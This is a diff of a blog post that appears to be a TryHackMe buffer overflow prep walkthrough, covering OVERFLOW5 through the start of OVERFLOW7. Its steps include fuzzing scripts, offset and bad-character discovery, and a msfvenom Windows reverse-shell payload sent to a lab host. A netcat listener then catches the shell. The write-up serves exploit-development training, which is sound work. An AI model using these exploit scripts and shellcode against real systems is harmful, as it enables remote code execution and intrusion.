@@ -2786,15 +2760,14 @@ payload += b"\x24\x3e\xb0\x0c\xa0\x47\xac\xac\x4f\x92\x74"
 payload += b"\xcc\xad\x36\x81\x65\x68\xd3\x28\xe8\x8b\x0e"
 payload += b"\x6e\x15\x08\xba\x0f\xe2\x10\xcf\x0a\xae\x96"
 payload += b"\x3c\x67\xbf\x72\x42\xd4\xc0\x56\x42\xda\x3e"
-payload += b"\x59" 
-```
-{% endraw %}
+payload += b"\x59"
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of5generatepayload %}
 
 <br />
 Update the code with a nop sled and the payload we just generated.
 
-{% raw %}
-```python
+{% capture of508 %}
 import socket
 from struct import pack
 
@@ -2852,34 +2825,41 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW5 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of5_0x08.py' content=of508 %}
 
 <br />
 Start a netcat listener.  Run the code.  Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture of5catchshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW5]
 └─$ sudo nc -nlvp 443
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56206
+{% endcapture %}
+
+{% capture of5windowsshell %}
 Microsoft Windows [Version 10.0.19045.3803]
 (c) Microsoft Corporation. All rights reserved.
 
 C:\Program Files\Windows Kits\10\Debuggers>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=of5catchshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=of5windowsshell %}
 
 <br />
-<b><u>OVERFLOW6<br /></u></b>
+<div id="overflow6">
+    <b><u>OVERFLOW6<br /></u></b>
+</div>
 
+<br />
 Create a script that connects to the service and sends the OVERFLOW6 command mimicking normal usage.
 
-{% raw %}
-```python
+{% capture of600 %}
 import socket
 
 url = '10.0.0.7'
@@ -2893,15 +2873,14 @@ print(s.recv(1024))
 s.send(b'OVERFLOW6 aaaa\r\n')
 print(s.recv(1024))
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of6_0x00.py' content=of600 %}
 
 <br />
 Update the code to fuzz the command with increasing length to find the breakpoint.
 
-{% raw %}
-```python
+{% capture of601 %}
 import socket
 
 url = '10.0.0.7'
@@ -2923,16 +2902,15 @@ for inputBuffer in buffers:
     s.send(b'OVERFLOW6 ' + inputBuffer + b'\r\n')
     s.recv(1024)
 
-    s.close() 
-```
-{% endraw %}
+    s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of6_0x01.py' content=of601 %}
 
 <br />
 Run the code and observe the breakpoint.
 
-{% raw %}
-```python
-= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW6/thm-overflow6_0x01.py
+{% capture of6findbreakpoint %}
+= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW6/of6_0x01.py
 [*] Sending: 1
 [*] Sending: 100
 [*] Sending: 200
@@ -2945,8 +2923,8 @@ Run the code and observe the breakpoint.
 [*] Sending: 900
 [*] Sending: 1000
 [*] Sending: 1100
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of6findbreakpoint %}
 
 <br />
 Check the EIP to ensure that we have control of EIP.
@@ -2960,8 +2938,7 @@ Check the EIP to ensure that we have control of EIP.
 <br />
 Update the script to hardcode the size that breaks the buffer.
 
-{% raw %}
-```python
+{% capture of602 %}
 import socket
 
 url = '10.0.0.7'
@@ -2978,8 +2955,8 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW6 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of6_0x02.py' content=of602 %}
 
 <br />
 Run the code and check EIP to ensure that we still have control.
@@ -2990,19 +2967,20 @@ Run the code and check EIP to ensure that we still have control.
     </div>
 </div>
 
-{% raw %}
-```bash
+<br />
+Use pattern create with a length of 1500 that will be used to help determine the EIP offset so we can eventually take control of the register.
+
+{% capture of6patterncreate %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW8]
 └─$ msf-pattern_create -l 1500
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9 
-```
-{% endraw %}
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of6patterncreate %}
 
 <br />
 Update the code with the pattern_create string that we just generated.
 
-{% raw %}
-```python
+{% capture of603 %}
 import socket
 
 url = '10.0.0.7'
@@ -3019,9 +2997,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW6 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of6_0x03.py' content=of603 %}
 
 <br />
 Check the EIP and note the value that is stored in the register.
@@ -3035,19 +3013,17 @@ Check the EIP and note the value that is stored in the register.
 <br />
 Run the string from the regster through msf-pattern_offset to get the exact offset.
 
-{% raw %}
-```bash
+{% capture of6findoffset %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW6]
 └─$ msf-pattern_offset -l 1500 -q 35694234                                                      
 [*] Exact match at offset 1034
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of6findoffset %}
 
 <br />
 Update the code to include the offset value that we just calculated.
 
-{% raw %}
-```python
+{% capture of604 %}
 import socket
 
 url = '10.0.0.7'
@@ -3065,15 +3041,14 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW6 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of6_0x04.py' content=of604 %}
 
 <br />
 Run the script and view the 42s in EIP.  Update the code with a list of all the badchars wo we can test them.
 
-{% raw %}
-```python
+{% capture of605 %}
 import socket
 
 url = '10.0.0.7'
@@ -3111,9 +3086,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW6 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of6_0x05.py' content=of605 %}
 
 <br />
 Check the ESP register to view the baschars and find any mangles.
@@ -3127,8 +3102,7 @@ Check the ESP register to view the baschars and find any mangles.
 <br />
 Look for sections where the string drops, missing, or change.  Remove the bad character from the set.  Resend it and scan ESP for more bad characters.  Repeat until you have found them all.  Gotta catch 'em all.
 
-{% raw %}
-```python
+{% capture of606 %}
 import socket
 
 url = '10.0.0.7'
@@ -3169,8 +3143,8 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW6 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of6_0x06.py' content=of606 %}
 
 <br />
 Update the code to change the badchars to payload = b'D' * 400 as a stub for the payload.  Then, in WinDBG, load the narly extension.
@@ -3193,8 +3167,7 @@ Run nmod to get a list of modules and their security to find the appropriate mod
 <br />
 Update the code with the address that was discovered in the essfunc.dll.
 
-{% raw %}
-```python
+{% capture of607 %}
 import socket
 from struct import pack
 
@@ -3218,15 +3191,14 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW6 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of6_0x07.py' content=of607 %}
 
 <br />
 Use msfvenom to generate a payload.
 
-{% raw %}
-```bash
+{% capture of6generatepayload %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW6]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -f python -v payload -b '\x00\x08\x2c\xad'    
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -3269,15 +3241,14 @@ payload += b"\xf3\x24\xa2\xc1\x3f\xf7\xb4\xcd\x15\x81\x58"
 payload += b"\x7f\xc0\xd4\x67\xb0\x84\xd0\x10\xac\x34\x1e"
 payload += b"\xcb\x74\x54\xfd\xd9\x80\xfd\x58\x88\x28\x60"
 payload += b"\x5b\x67\x6e\x9d\xd8\x8d\x0f\x5a\xc0\xe4\x0a"
-payload += b"\x26\x46\x15\x67\x37\x23\x19\xd4\x38\x66" 
-```
-{% endraw %}
+payload += b"\x26\x46\x15\x67\x37\x23\x19\xd4\x38\x66"
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of6generatepayload %}
 
 <br />
 Update the code with a nop sled and the payload we just generated.
 
-{% raw %}
-```python
+{% capture of608 %}
 import socket
 from struct import pack
 
@@ -3334,34 +3305,41 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW6 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of6_0x08.py' content=of608 %}
 
 <br />
 Start a netcat listener.  Run the code.  Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture of6catchshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW6]
 └─$ sudo nc -nlvp 443
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56205
+{% endcapture %}
+
+{% capture of6windowsshell %}
 Microsoft Windows [Version 10.0.19045.3803]
 (c) Microsoft Corporation. All rights reserved.
 
 C:\Program Files\Windows Kits\10\Debuggers>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=of6catchshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=of6windowsshell %}
 
 <br />
-<b><u>OVERFLOW7<br /></u></b>
+<div id="overflow7">
+    <b><u>OVERFLOW7<br /></u></b>
+</div>
 
+<br />
 Create a script that connects to the service and sends the OVERFLOW7 command mimicking normal usage.
 
-{% raw %}
-```python
+{% capture of700 %}
 import socket
 
 url = '10.0.0.7'
@@ -3376,14 +3354,13 @@ s.send(b'OVERFLOW7 aaaa\r\n')
 print(s.recv(1024))
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of7_0x00.py' content=of700 %}
 
 <br />
 Update the code to fuzz the command with increasing length to find the breakpoint.  Note that I had to fiddle with the counter to break EIP.  With the normal counter, it wouldn't overwrite EIP.
 
-{% raw %}
-```python
+{% capture of701 %}
 import socket
 
 url = '10.0.0.7'
@@ -3406,22 +3383,21 @@ for inputBuffer in buffers:
     s.recv(1024)
 
     s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of7_0x01.py' content=of701 %}
 
 <br />
 Run the code and observe the breakpoint.
 
-{% raw %}
-```python
-= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW7/thm-overflow7_0x01.py
+{% capture of7findoffset %}
+= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW7/of7_0x01.py
 [*] Sending: 1
 [*] Sending: 100
 [*] Sending: 600
 [*] Sending: 1100
 [*] Sending: 1600
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of7findoffset %}
 
 <br />
 Check the EIP to ensure that we have control of EIP.
@@ -3435,8 +3411,7 @@ Check the EIP to ensure that we have control of EIP.
 <br />
 Update the script to hardcode the size that breaks the buffer.
 
-{% raw %}
-```python
+{% capture of702 %}
 import socket
 
 url = '10.0.0.7'
@@ -3453,8 +3428,8 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW7 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of7_0x02.py' content=of702 %}
 
 <br />
 Run the code and check EIP to ensure that we still have control.
@@ -3465,19 +3440,17 @@ Run the code and check EIP to ensure that we still have control.
     </div>
 </div>
 
-{% raw %}
-```bash
+{% capture of7patterncreate %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW2]
 └─$ msf-pattern_create -l 2000                                                                                                   
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co 
-```
-{% endraw %}
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0C